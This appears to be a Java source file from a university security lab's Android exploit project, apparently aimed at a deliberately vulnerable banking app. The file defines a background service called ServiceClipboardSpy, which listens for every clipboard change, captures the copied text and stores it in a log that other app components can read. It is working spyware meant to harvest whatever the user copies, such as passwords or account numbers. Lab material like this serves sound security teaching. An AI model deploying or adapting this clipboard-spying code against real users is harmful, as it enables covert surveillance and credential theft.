package ch.zhaw.securitylab.DIBA_exploit;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.ClipboardManager.OnPrimaryClipChangedListener;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;

import java.util.ArrayList;
import java.util.List;

public class ServiceClipboardSpy extends Service implements OnPrimaryClipChangedListener
{
	// -------------------------------------------- //
	// FIELDS
	// -------------------------------------------- //
	
	// Binder given to clients
	private final IBinder mBinder = new LocalBinder();
	private ClipboardManager clipboard;
	
	private static final ArrayList<String> CLIPBOARD_LOG = new ArrayList<>();
	public List<String> getLog() { return CLIPBOARD_LOG; }
	
	// -------------------------------------------- //
	// CONSTRUCT & CREATE
	// -------------------------------------------- //
	
	@Override
	public void onCreate() {
		super.onCreate();
		clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
		if (clipboard == null) return;
		clipboard.addPrimaryClipChangedListener(this);
	}
	
	// -------------------------------------------- //
	// OVERRIDE
	// -------------------------------------------- //
	
	@Override
	public void onPrimaryClipChanged() {
		String text = clipboard.getPrimaryClip().toString();
		System.out.println(text);
		CLIPBOARD_LOG.add(text);
	}
	
	public class LocalBinder extends Binder {
		ServiceClipboardSpy getService()
		{
			return ServiceClipboardSpy.this;
		}
	}
	
	@Override
	public IBinder onBind(Intent intent)
	{
		return mBinder;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}
	
}
